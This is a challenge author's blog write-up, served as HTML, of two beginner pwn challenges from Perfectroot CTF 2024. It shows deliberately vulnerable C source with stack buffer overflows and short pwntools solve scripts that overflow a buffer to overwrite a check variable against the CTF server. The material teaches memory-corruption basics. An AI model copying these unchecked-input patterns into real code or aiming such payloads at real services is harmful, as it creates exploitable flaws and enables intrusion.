@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en-us">
+<head><script src="/blog/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=blog/livereload" data-no-instant defer></script>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="theme-color" content="#1b1b1b">
+	<title>Perfectroot CTF 2024 Writeups | Dexter</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		
+  <meta itemprop="name" content="Perfectroot CTF 2024 Writeups">
+  <meta itemprop="description" content="Introduction The p3rf3ctr00t CTF 2024 marked the debut of an exciting competition designed to challenge participants across diverse areas of cybersecurity. As one of the contributors of this event, I had the privilege of crafting some challenges that tested some problem solving skills.
+I will try and walk you through the design and solution of the challenges I created, providing insights into their concepts. Let’s learn.
+Flow First we are met with the challenge name Flow. This was a slight hint that we were to do something with overflows and memory corruption bugs as a whole. We are also provided with the connection where we can use netcat to interact with the program from a remote instance.">
+  <meta itemprop="datePublished" content="2024-11-23T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2024-11-23T00:00:00+00:00">
+  <meta itemprop="wordCount" content="1169">
+  <meta itemprop="keywords" content="Pwn">
+	<link rel="stylesheet" href="/blog/css/bundle.css">
+	<link rel="icon" href="/blog/icons/16.png" sizes="16x16" type="image/png">
+	<link rel="icon" href="/blog/icons/32.png" sizes="32x32" type="image/png">
+</head>
+<body class="body kind-page">
+	<header class="header">
+	<a class="logo" href="/blog/">Dexter</a>
+	
+</header>
+	<div class="primary">
+	
+	<main class="main">
+		
+		<div class="single block">
+			<article class="entry">
+				<h1 class="entry__title">Perfectroot CTF 2024 Writeups</h1>
+<details class="entry__toc toc" open>
+	<summary class="toc__title">Table of Contents</summary>
+	<nav id="TableOfContents">
+  <ul>
+    <li><a href="#flow">Flow</a>
+      <ul>
+        <li><a href="#source-code">Source Code</a></li>
+        <li><a href="#solve-script">Solve script</a></li>
+      </ul>
+    </li>
+    <li><a href="#nihil">Nihil</a>
+      <ul>
+        <li><a href="#source-code-1">Source Code</a></li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+</details>
+				<div class="entry__content"><h1 id="introduction">Introduction</h1>
+<p>The p3rf3ctr00t CTF 2024 marked the debut of an exciting competition designed to challenge participants across diverse areas of cybersecurity. As one of the contributors of this event, I had the privilege of crafting some challenges that tested some problem solving skills.</p>
+<p>I will try and walk you through the design and solution of the challenges I created, providing insights into their concepts. Let&rsquo;s learn.</p>
+<h2 id="flow">Flow</h2>
+<p><img src="https://gist.github.com/user-attachments/assets/d8a6dae0-b3ee-4420-8f1d-f3140f71830b" alt="CTFD img"></p>
+<p>First we are met with the challenge name <code>Flow</code>. This was a slight hint that we were to do something with overflows and memory corruption bugs as a whole. We are also provided with the connection where we can use <code>netcat</code> to interact with the program from a remote instance.</p>
+<p>We can now download the binary and try and understand it&rsquo;s logic. By this we can do some basic file checks which would be pivotal in giving us some information about the binary.</p>
+<p><img src="https://gist.github.com/user-attachments/assets/68602e63-534f-48f7-a1f9-5e78182ef8a4" alt="File check"></p>
+<p>The binary is a 64-bit ELF pie executable.</p>
+<p><img src="https://gist.github.com/user-attachments/assets/71403ac1-a1ba-43ae-be31-388d9db31230" alt="Checksec"></p>
+<p>We can then move on to check the securities the binary was compiled with. We see that we have a partial RELRO, no canary, NX and PIE  enabled. Now don&rsquo;t worry there, I have a blog where I explain what this means. Check it out <a href="https://w47.site/posts/thm/binary103/">here</a></p>
+<p><img src="https://gist.github.com/user-attachments/assets/74f6614f-ea1d-4144-a2cd-0035897eb3ac" alt="Running the binary"></p>
+<p>Now we can then run the binary and see what it does. It just asks for input then exits</p>
+<p><img src="https://gist.github.com/user-attachments/assets/d31193eb-d3f5-486a-88f3-1920b8ab2556" alt="Disassembly in pwndbg"></p>
+<p>We can then get a lay of the land using <code>pwndbg</code>. We have a main, vulnerable and win function in the binary.</p>
+<p><img src="https://gist.github.com/user-attachments/assets/b1259754-835a-4aa8-bdfd-029d96200097" alt="Disassembling the main function"></p>
+<p>Now I can open up the binary in Ghidra and move to the <code>vulnerable()</code> function to understand the logic.</p>
+<p><img src="https://gist.github.com/user-attachments/assets/b0a4187b-9a40-40d9-a110-752aeb0cbf1c" alt="Using ghidra to understand the vulnerable function"></p>
+<p>The function <code>vulnerable()</code> is flawed because it allows for a buffer overflow, where the buffer is allocated with <code>0x30</code> bytes that is 48 bytes in decimal on the stack.
+The function takes in 64 characters as input but does not check if the input exceeds the buffer size.</p>
+<p>This means that any input beyond 48 bytes will overflow the buffer and overwrite adjacent memory on the stack.</p>
+<p>The program uses the stack to store, a 48-byte space allocated for input data and a key variable, located just above the buffer which was initially set to <code>key = 0xc</code></p>
+<p>From here we see that we have an <code>if</code> check that does</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (local_c <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x34333231</span>) {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">win</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This key variable is stored on the stack as a 4-byte (32-bit) integer. The input string provided will treated as a sequence of ASCII characters.</p>
+<ul>
+<li>1 -&gt; 0x31</li>
+<li>2 -&gt; 0x32</li>
+<li>3 -&gt; 0x33</li>
+<li>4 -&gt; 0x34</li>
+</ul>
+<p>When you input the string <code>1234</code> it translates into the hexadecimal bytes as shown above.
+The next thing to confirm is the type of endianness which we can check using <code>rabin2 -I flow</code></p>
+<p><img src="https://gist.github.com/user-attachments/assets/803893b4-698d-4a5d-8f7c-52595cc1d0cf" alt="Checking the file endianness"></p>
+<p>We can clearly see that we have our endian as <code>little</code></p>
+<p>Here is a little script to confirm the translation</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">60</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1234&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>key_overwrite <span style="color:#f92672">=</span> payload[<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>:]
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Key in hex: &#34;</span>, key_overwrite<span style="color:#f92672">.</span>hex())
+</span></span></code></pre></div><p><img src="https://gist.github.com/user-attachments/assets/01d0a6f1-4845-4916-aabb-49b1f891ee99" alt="Hex translation"></p>
+<h3 id="source-code">Source Code</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__attribute__</span>((constructor)) <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">flush_buf</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setbuf</span>(stdin, NULL);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setbuf</span>(stdout, NULL);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setbuf</span>(stderr, NULL);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">win</span>() {
+</span></span><span style="display:flex;"><span>    FILE<span style="color:#f92672">*</span> flag_file;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> c;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    flag_file <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;flag.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (flag_file <span style="color:#f92672">!=</span> NULL) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Your flag is - &#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> ((c <span style="color:#f92672">=</span> <span style="color:#a6e22e">getc</span>(flag_file)) <span style="color:#f92672">!=</span> EOF) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%c&#34;</span>, c);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Could not find flag.txt</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vulnerable</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> key <span style="color:#f92672">=</span> <span style="color:#ae81ff">12</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">0x30</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Enter a text please: &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%64s&#34;</span>, buffer);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (key <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x34333231</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">win</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">vulnerable</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="solve-script">Solve script</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;94.72.112.248&#34;</span>, <span style="color:#ae81ff">7001</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">60</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1234&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(payload)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h2 id="nihil">Nihil</h2>
+<p><img src="https://gist.github.com/user-attachments/assets/ac3a1dd2-e1cc-48c2-bb2f-115af9be1457" alt="CTFd Image"></p>
+<p>The next challenge was also pwn, and this was a bit more tricky and needed one to understand how the stack works. But this challenge is very similar to the first in general.</p>
+<p><img src="https://gist.github.com/user-attachments/assets/09107ade-32d3-4272-ae01-0b05a6bd5ec8" alt="File checks"></p>
+<p>After downloading the binary we can then perform our normal file checks. This informs us that the binary is 64-bit LSB pie executable.</p>
+<p><img src="https://gist.github.com/user-attachments/assets/a58457d2-4ce4-4e59-bde1-fe5af0bf6e62" alt="checksec"></p>
+<p>We can now check the securities the binary was compiled with and it looks pretty much as the challenge <code>flow</code></p>
+<p>We can now run the binary and get a rough idea of what it does</p>
+<p><img src="https://gist.github.com/user-attachments/assets/aac24043-47fb-49b1-bbed-34f5b00a39ec" alt="Running the binary"></p>
+<p>Now from the challenge description the author mentions <code>can you beat me at a guessing game?</code> . The idea here would be can you get the correct guess in other words. With that in mind we can now disassemble the binary.</p>
+<p><img src="https://gist.github.com/user-attachments/assets/1efead37-8a97-4866-b17a-8cae3989a72d" alt="pwndbg"></p>
+<p>We do not have a lot of interesting functions as before, but we can disassemble the main function in Ghidra.</p>
+<p><img src="https://gist.github.com/user-attachments/assets/c736cdac-5692-48ba-bb92-9511b619dc73" alt="Ghidra"></p>
+<p>It seems the main function does a check where it compares a variable to a value and then if they are equal, it prints the flag</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (local_c <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x2d7</span>)
+</span></span></code></pre></div><p>Using python we can calculate what <code>0x2d7</code> could be potentially to help with crafting of our payload later.</p>
+<p><img src="https://gist.github.com/user-attachments/assets/f9bb02ad-6b19-487a-b08b-2a4a4735a0a8" alt="0x2d7"></p>
+<p>Now we can break this down this way. A buffer <code>char local_28[16]</code> is allocated, meaning it can hold 15 characters, plus the null terminator.</p>
+<p>The <code>fgets()</code> function can read up to 100 characters into this buffer. Since the buffer is only 16 bytes in size, reading more than 15 characters will overflow the buffer and overwrite the adjacent memory on the stack.</p>
+<p>The stack is organized in a way that variables and control data (like return addresses) are stored in memory blocks. When <code>fgets()</code> writes more data than the buffer can hold, it overwrites the memory outside the intended region.
+This can cause corruption of adjacent variables or the return address on the layout of the stack.</p>
+<p>With this information we can now try and craft our payload.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;94.72.112.248&#34;</span>, <span style="color:#ae81ff">7002</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;727&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;aaaaaaaaaaaa727&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>We can break down our payload by first sending the value <code>727</code> to the binary, then the binary asks us if we have any last words. That is where we can send our the payload that includes, <code>12 a's</code> that will help in filling the buffer, and the <code>727</code> to make the check equal, this will then print out our flag.</p>
+<h3 id="source-code-1">Source Code</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>FILE <span style="color:#f92672">*</span>flag_file;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> flag[<span style="color:#ae81ff">100</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> pp;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> my_pp;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">16</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">setbuf</span>(stdin, NULL);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">setbuf</span>(stdout, NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;How much did you get? &#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fgets</span>(buf, <span style="color:#ae81ff">100</span>, stdin);
+</span></span><span style="display:flex;"><span>        pp <span style="color:#f92672">=</span> <span style="color:#a6e22e">atoi</span>(buf);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        my_pp <span style="color:#f92672">=</span> pp <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Any last words?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fgets</span>(buf, <span style="color:#ae81ff">100</span>, stdin);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (pp <span style="color:#f92672">&lt;=</span> my_pp) {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Ha! I got %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, my_pp);
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Maybe you will beat me next time</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;What, How did you beat me?&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (pp <span style="color:#f92672">==</span> <span style="color:#ae81ff">727</span>) {
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Here is your flag: &#34;</span>);
+</span></span><span style="display:flex;"><span>                        flag_file <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;flag.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>);
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">fgets</span>(flag, <span style="color:#66d9ef">sizeof</span>(flag), flag_file);
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, flag);
+</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Just kidding!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
+<p>I took heavy inspiration from past CTF challenges that I came across, so you might have come across this challenges before. I hope you have learned a thing or two about memory corruption bugs</p>
+<p>Special shoutout to <code>0x1337</code> on solving most of the pwn challenges. You can also get other ways of solving the challenges above and many other more by going through his <a href="https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/perfectr00t24/solution.md">article</a></p>
+</div>
+				
+				<footer class="entry__footer">
+					
+<div class="entry__tags">
+			<a class="entry__tag btn" href="/blog/tags/pwn/">Pwn</a>
+</div>
+					
+<div class="entry__share share">
+	<a class="share__link btn" title="Share on Twitter" href="https://twitter.com/intent/tweet/?url=http%3a%2f%2flocalhost%3a1313%2fblog%2fposts%2fp3rf3ctr00tctf_2024%2f&amp;text=Perfectroot%20CTF%202024%20Writeups" target="_blank" rel="noopener noreferrer" onclick="window.open(this.href, 'Share on Twitter', 'width=800,height=450,resizable=yes,toolbar=0,status=0'); return false">
+		<svg class="share__icon" aria-label="Twitter" role="img" width="32" height="32" viewBox="0 0 512 512"><path d="M437 152a72 72 0 0 1-40 12 72 72 0 0 0 32-40 72 72 0 0 1-45 17 72 72 0 0 0-122 65 200 200 0 0 1-145-74 72 72 0 0 0 22 94 72 72 0 0 1-32-7 72 72 0 0 0 56 69 72 72 0 0 1-32 1 72 72 0 0 0 67 50 200 200 0 0 1-105 29 200 200 0 0 0 309-179 200 200 0 0 0 35-37"/></svg>
+	</a>
+	<a class="share__link btn" title="Share on LinkedIn" href="https://www.linkedin.com/shareArticle?mini=true&url=http%3a%2f%2flocalhost%3a1313%2fblog%2fposts%2fp3rf3ctr00tctf_2024%2f&title=Perfectroot%20CTF%202024%20Writeups" target="_blank" rel="noopener noreferrer" onclick="window.open(this.href, 'Share on LinkedIn', 'width=640,height=480,toolbar=0,status=0'); return false">
+		<svg class="share__icon" aria-label="LinkedIn" role="img" width="32" height="32" viewBox="0 0 512 512"><circle cx="142" cy="138" r="37"/><path stroke-width="66" d="M244 194v198M142 194v198"/><path d="M276 282c0-20 13-40 36-40 24 0 33 18 33 45v105h66V279c0-61-32-89-76-89-34 0-51 19-59 32"/></svg>
+	</a>
+</div>
+				</footer>
+				
+			</article>
+		</div>
+	</main>
+	
+<div class="authorbox block">
+	<div class="author">
+		<div class="author__body">
+			<div class="author__name">
+				Dexter
+			</div>
+			<div class="author__bio">Just human</div>
+		</div>
+	</div>
+</div>
+	
+
+
+
+	
+
+	</div>
+	<footer class="footer">
+<div class="footer__social social">
+		<a class="social__link" target="_blank" rel="noopener noreferrer" href="mailto:dexter7isme@gmail.com">
+			<svg class="social__icon" aria-label="Email" role="img" width="32" height="32" viewBox="0 0 512 512"><path d="M299 268l124 106c-4 4-10 7-17 7H106c-7 0-13-3-17-7l124-106 43 38 43-38zm-43 13L89 138c4-4 10-7 17-7h300c7 0 13 3 17 7L256 281zm54-23l121-105v208L310 258zM81 153l121 105L81 361V153z"/></svg>
+		</a>
+		<a class="social__link" target="_blank" rel="noopener noreferrer" href="https://github.com/w-47">
+			<svg class="social__icon" aria-label="Github" role="img" width="32" height="32" viewBox="0 0 512 512"><path d="M335 499c14 0 12 17 12 17H165s-2-17 12-17c13 0 16-6 16-12l-1-50c-71 16-86-28-86-28-12-30-28-37-28-37-24-16 1-16 1-16 26 2 40 26 40 26 22 39 59 28 74 22 2-17 9-28 16-35-57-6-116-28-116-126 0-28 10-51 26-69-3-6-11-32 3-67 0 0 21-7 70 26 42-12 86-12 128 0 49-33 70-26 70-26 14 35 6 61 3 67 16 18 26 41 26 69 0 98-60 120-117 126 10 8 18 24 18 48l-1 70c0 6 3 12 16 12z"/></svg>
+		</a>
+</div>
+	<div class="footer__copyright">© 2025 Dexter. <span class="footer__copyright-credits">Powered by <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/vimux/binario" rel="nofollow noopener" target="_blank">Binario</a> theme.</span></div>
+</footer>
+</body>
+</html>
